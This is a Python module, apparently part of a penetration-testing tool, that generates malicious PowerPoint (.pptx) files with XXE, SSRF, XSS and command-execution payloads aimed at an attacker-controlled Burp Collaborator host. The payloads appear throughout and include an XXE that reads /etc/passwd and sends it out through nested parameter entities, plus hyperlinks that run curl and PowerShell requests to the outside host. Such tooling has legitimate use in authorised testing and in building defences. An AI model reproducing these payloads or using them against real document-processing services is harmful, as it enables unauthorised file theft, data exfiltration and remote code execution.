from pathlib import Path
import zipfile
import tempfile

try:
    from .ssti_filename_generator import generate_ssti_filename_payloads
    from .xss_filename_generator import generate_xss_filename_payloads
except ImportError:
    try:
        from ssti_filename_generator import generate_ssti_filename_payloads
        from xss_filename_generator import generate_xss_filename_payloads
    except ImportError:
        generate_ssti_filename_payloads = None
        generate_xss_filename_payloads = None

def generate_pptx_payloads(output_dir, burp_collab, tech_filter='all', payload_types=None):
    if payload_types is None:
        payload_types = {'all'}
    
    def should_generate_type(payload_type):
        return 'all' in payload_types or payload_type in payload_types
    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)
    base_url = f"http://{burp_collab}"
    
    if should_generate_type('xxe'):
        xxe_dir = output_dir / 'xxe'
        xxe_dir.mkdir(exist_ok=True)
    if should_generate_type('ssrf'):
        ssrf_dir = output_dir / 'ssrf'
        ssrf_dir.mkdir(exist_ok=True)
    if should_generate_type('rce') or should_generate_type('deserialization'):
        rce_dir = output_dir / 'rce'
        rce_dir.mkdir(exist_ok=True)
    if should_generate_type('xss'):
        xss_dir = output_dir / 'xss'
        xss_dir.mkdir(exist_ok=True)
    
    pptx_xxe1_doctype = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-pptx-1">
]>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
    
    if should_generate_type('xxe'):
        output_file = xxe_dir / "xxe1_doctype.pptx"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
            (temp_path / "_rels").mkdir()
            (temp_path / "ppt").mkdir()
            (temp_path / "ppt" / "presentation.xml").write_text(pptx_xxe1_doctype)
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
    
    pptx_xxe2_parameter = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY % xxe SYSTEM "{base_url}/xxe-pptx-2">
%xxe;
]>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
    
    if should_generate_type('xxe'):
        output_file = xxe_dir / "xxe2_parameter.pptx"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
            (temp_path / "_rels").mkdir()
            (temp_path / "ppt").mkdir()
            (temp_path / "ppt" / "presentation.xml").write_text(pptx_xxe2_parameter)
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
    
    pptx_ssrf1_http = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
    
    if should_generate_type('ssrf'):
        output_file = ssrf_dir / "ssrf1_http.pptx"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
            (temp_path / "_rels").mkdir()
            (temp_path / "_rels" / "presentation.xml.rels").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="{base_url}/ssrf-pptx-1" TargetMode="External"/>
</Relationships>''')
            (temp_path / "ppt").mkdir()
            (temp_path / "ppt" / "presentation.xml").write_text(pptx_ssrf1_http)
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
    
    pptx_ssrf2_https = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
    
    if should_generate_type('ssrf'):
        output_file = ssrf_dir / "ssrf2_https.pptx"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
            (temp_path / "_rels").mkdir()
            (temp_path / "_rels" / "presentation.xml.rels").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="https://{burp_collab}/ssrf-pptx-2" TargetMode="External"/>
</Relationships>''')
            (temp_path / "ppt").mkdir()
            (temp_path / "ppt" / "presentation.xml").write_text(pptx_ssrf2_https)
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
    
    pptx_xss1_hyperlink = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
    
    if should_generate_type('xss'):
        output_file = xss_dir / "xss1_hyperlink_js.pptx"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
            (temp_path / "_rels").mkdir()
            (temp_path / "ppt").mkdir()
            (temp_path / "ppt" / "presentation.xml").write_text(pptx_xss1_hyperlink)
            (temp_path / "ppt" / "slides").mkdir()
            (temp_path / "ppt" / "slides" / "slide1.xml").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<p:cSld>
<p:spTree>
<p:sp>
<p:txBody>
<a:p>
<a:r>
<a:t>=HYPERLINK("javascript:alert(1)","click")</a:t>
</a:r>
</a:p>
</p:txBody>
</p:sp>
</p:spTree>
</p:cSld>
</p:sld>''')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
    
    pptx_xss2_href = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
    
    if should_generate_type('xss'):
        output_file = xss_dir / "xss2_href_js.pptx"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
            (temp_path / "_rels").mkdir()
            (temp_path / "ppt").mkdir()
            (temp_path / "ppt" / "presentation.xml").write_text(pptx_xss2_href)
            (temp_path / "ppt" / "slides").mkdir()
            (temp_path / "ppt" / "slides" / "slide1.xml").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<p:cSld>
<p:spTree>
<p:sp>
<p:txBody>
<a:p>
<a:r>
<a:t>click</a:t>
</a:r>
</a:p>
</p:txBody>
<a:hlinkClick r:id="rIdXSS" action="javascript:alert(1)"/>
</p:sp>
</p:spTree>
</p:cSld>
</p:sld>''')
            
            (temp_path / "ppt" / "slides" / "_rels").mkdir()
            (temp_path / "ppt" / "slides" / "_rels" / "slide1.xml.rels").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rIdXSS" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="javascript:alert(1)" TargetMode="External"/>
</Relationships>''')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
    
    if should_generate_type('ssrf'):
        pptx_ssrf3_images = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
        
        output_file = ssrf_dir / "ssrf3_images.pptx"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
            (temp_path / "_rels").mkdir()
            (temp_path / "ppt").mkdir()
            (temp_path / "ppt" / "presentation.xml").write_text(pptx_ssrf3_images)
            (temp_path / "ppt" / "slides").mkdir()
            (temp_path / "ppt" / "slides" / "slide1.xml").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<p:cSld>
<p:spTree>
<a:pic>
<a:blip r:embed="rIdImg1"/>
</a:pic>
</p:spTree>
</p:cSld>
</p:sld>''')
            (temp_path / "ppt" / "slides" / "_rels").mkdir()
            (temp_path / "ppt" / "slides" / "_rels" / "slide1.xml.rels").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rIdImg1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="{base_url}/img-pptx-1.png" TargetMode="External"/>
</Relationships>''')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        pptx_ssrf4_media = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
        
        output_file = ssrf_dir / "ssrf4_media.pptx"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
            (temp_path / "_rels").mkdir()
            (temp_path / "ppt").mkdir()
            (temp_path / "ppt" / "presentation.xml").write_text(pptx_ssrf4_media)
            (temp_path / "ppt" / "slides").mkdir()
            (temp_path / "ppt" / "slides" / "slide1.xml").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<p:cSld>
<p:spTree>
<a:pic>
<a:blip r:link="rIdMedia1"/>
</a:pic>
</p:spTree>
</p:cSld>
</p:sld>''')
            (temp_path / "ppt" / "slides" / "_rels").mkdir()
            (temp_path / "ppt" / "slides" / "_rels" / "slide1.xml.rels").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rIdMedia1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/video" Target="{base_url}/media-pptx-1.mp4" TargetMode="External"/>
</Relationships>''')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        pptx_ssrf5_hyperlink = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
        
        output_file = ssrf_dir / "ssrf5_hyperlink.pptx"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
            (temp_path / "_rels").mkdir()
            (temp_path / "ppt").mkdir()
            (temp_path / "ppt" / "presentation.xml").write_text(pptx_ssrf5_hyperlink)
            (temp_path / "ppt" / "slides").mkdir()
            (temp_path / "ppt" / "slides" / "slide1.xml").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<p:cSld>
<p:spTree>
<p:sp>
<p:txBody>
<a:p>
<a:r>
<a:t>=HYPERLINK("{base_url}/ssrf-pptx-hyperlink1","click")</a:t>
</a:r>
</a:p>
</p:txBody>
</p:sp>
</p:spTree>
</p:cSld>
</p:sld>''')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
    
    if should_generate_type('xxe'):
        pptx_xxe3_file = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
<comment>&xxe;</comment>
</p:presentation>'''
        
        output_file = xxe_dir / "xxe3_file.pptx"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
            (temp_path / "_rels").mkdir()
            (temp_path / "ppt").mkdir()
            (temp_path / "ppt" / "presentation.xml").write_text(pptx_xxe3_file)
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        pptx_xxe4_nested = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "{base_url}/xxe-pptx-nested">
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM '{base_url}/xxe-pptx-exfil?data=%file;'>">
%remote;
%eval;
%exfil;
]>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
        
        output_file = xxe_dir / "xxe4_nested.pptx"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
            (temp_path / "_rels").mkdir()
            (temp_path / "ppt").mkdir()
            (temp_path / "ppt" / "presentation.xml").write_text(pptx_xxe4_nested)
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        pptx_xxe5_slide = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "{base_url}/xxe-pptx-slide">
]>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
        
        output_file = xxe_dir / "xxe5_slide.pptx"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
            (temp_path / "_rels").mkdir()
            (temp_path / "ppt").mkdir()
            (temp_path / "ppt" / "presentation.xml").write_text(pptx_xxe5_slide)
            (temp_path / "ppt" / "slides").mkdir()
            (temp_path / "ppt" / "slides" / "slide1.xml").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE slide [
<!ENTITY xxe SYSTEM "{base_url}/xxe-pptx-slide1">
]>
<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:cSld>
<p:spTree>
<p:sp>
<p:txBody>
<a:p>
<a:r>
<a:t>&xxe;</a:t>
</a:r>
</a:p>
</p:txBody>
</p:sp>
</p:spTree>
</p:cSld>
</p:sld>''')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
    
    if should_generate_type('rce') or should_generate_type('deserialization'):
        pptx_rce1_hyperlink_cmd = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
        
        output_file = rce_dir / "rce1_hyperlink_cmd.pptx"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
            (temp_path / "_rels").mkdir()
            (temp_path / "ppt").mkdir()
            (temp_path / "ppt" / "presentation.xml").write_text(pptx_rce1_hyperlink_cmd)
            (temp_path / "ppt" / "slides").mkdir()
            (temp_path / "ppt" / "slides" / "slide1.xml").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<p:cSld>
<p:spTree>
<p:sp>
<p:txBody>
<a:p>
<a:r>
<a:t>=HYPERLINK("cmd:///c curl {base_url}/rce-pptx-cmd1","click")</a:t>
</a:r>
</a:p>
</p:txBody>
</p:sp>
</p:spTree>
</p:cSld>
</p:sld>''')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        pptx_rce2_hyperlink_ps = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
        
        output_file = rce_dir / "rce2_hyperlink_powershell.pptx"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
            (temp_path / "_rels").mkdir()
            (temp_path / "ppt").mkdir()
            (temp_path / "ppt" / "presentation.xml").write_text(pptx_rce2_hyperlink_ps)
            (temp_path / "ppt" / "slides").mkdir()
            (temp_path / "ppt" / "slides" / "slide1.xml").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<p:cSld>
<p:spTree>
<p:sp>
<p:txBody>
<a:p>
<a:r>
<a:t>=HYPERLINK("powershell://Invoke-WebRequest {base_url}/rce-pptx-ps1","click")</a:t>
</a:r>
</a:p>
</p:txBody>
</p:sp>
</p:spTree>
</p:cSld>
</p:sld>''')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        pptx_rce3_hlinkclick = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
        
        output_file = rce_dir / "rce3_hlinkclick_cmd.pptx"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
            (temp_path / "_rels").mkdir()
            (temp_path / "ppt").mkdir()
            (temp_path / "ppt" / "presentation.xml").write_text(pptx_rce3_hlinkclick)
            (temp_path / "ppt" / "slides").mkdir()
            (temp_path / "ppt" / "slides" / "slide1.xml").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<p:cSld>
<p:spTree>
<p:sp>
<p:txBody>
<a:p>
<a:r>
<a:t>click</a:t>
</a:r>
</a:p>
</p:txBody>
<a:hlinkClick r:id="rIdRCE3" action="cmd:///c curl {base_url}/rce-pptx-hlink1"/>
</p:sp>
</p:spTree>
</p:cSld>
</p:sld>''')
            (temp_path / "ppt" / "slides" / "_rels").mkdir()
            (temp_path / "ppt" / "slides" / "_rels" / "slide1.xml.rels").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rIdRCE3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="cmd:///c curl {base_url}/rce-pptx-hlink1" TargetMode="External"/>
</Relationships>''')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        pptx_rce4_ole_object = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
        
        output_file = rce_dir / "rce4_ole_object.pptx"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
            (temp_path / "_rels").mkdir()
            (temp_path / "ppt").mkdir()
            (temp_path / "ppt" / "presentation.xml").write_text(pptx_rce4_ole_object)
            (temp_path / "ppt" / "slides").mkdir()
            (temp_path / "ppt" / "slides" / "slide1.xml").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:o="urn:schemas-microsoft-com:office:office">
<p:cSld>
<p:spTree>
<p:sp>
<o:OLEObject ProgID="cmd" r:id="rIdOLE1"/>
</p:sp>
</p:spTree>
</p:cSld>
</p:sld>''')
            (temp_path / "ppt" / "slides" / "_rels").mkdir()
            (temp_path / "ppt" / "slides" / "_rels" / "slide1.xml.rels").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rIdOLE1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="{base_url}/rce-pptx-ole1" TargetMode="External"/>
</Relationships>''')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
        
        pptx_rce5_embedded = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:presentation xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main">
<p:sldIdLst>
<p:sldId id="1" r:id="rId1"/>
</p:sldIdLst>
</p:presentation>'''
        
        output_file = rce_dir / "rce5_embedded_script.pptx"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
            (temp_path / "_rels").mkdir()
            (temp_path / "ppt").mkdir()
            (temp_path / "ppt" / "presentation.xml").write_text(pptx_rce5_embedded)
            (temp_path / "ppt" / "slides").mkdir()
            (temp_path / "ppt" / "slides" / "slide1.xml").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<p:sld xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
<p:cSld>
<p:spTree>
<p:sp>
<p:txBody>
<a:p>
<a:r>
<a:t>=HYPERLINK("javascript:fetch('{base_url}/rce-pptx-js1')","click")</a:t>
</a:r>
</a:p>
</p:txBody>
</p:sp>
</p:spTree>
</p:cSld>
</p:sld>''')
            
            with zipfile.ZipFile(output_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
    
    if should_generate_type('ssrf') or should_generate_type('xxe'):
        master_file = output_dir / "master.pptx"
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            (temp_path / "[Content_Types].xml").write_text('<?xml version="1.0"?><Types></Types>')
            (temp_path / "_rels").mkdir()
            (temp_path / "_rels" / "presentation.xml.rels").write_text(f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/slide" Target="{base_url}/ssrf-pptx-master" TargetMode="External"/>
</Relationships>''')
            (temp_path / "ppt").mkdir()
            (temp_path / "ppt" / "presentation.xml").write_text(pptx_xxe1_doctype)
            
            with zipfile.ZipFile(master_file, 'w', zipfile.ZIP_DEFLATED) as zip_ref:
                for file_path in temp_path.rglob('*'):
                    if file_path.is_file():
                        arcname = file_path.relative_to(temp_path)
                        zip_ref.write(file_path, arcname)
    
    if generate_ssti_filename_payloads and should_generate_type('ssti'):
        generate_ssti_filename_payloads(output_dir, 'pptx', burp_collab, tech_filter)
    
    if generate_xss_filename_payloads and should_generate_type('xss'):
        generate_xss_filename_payloads(output_dir, 'pptx', burp_collab, tech_filter)
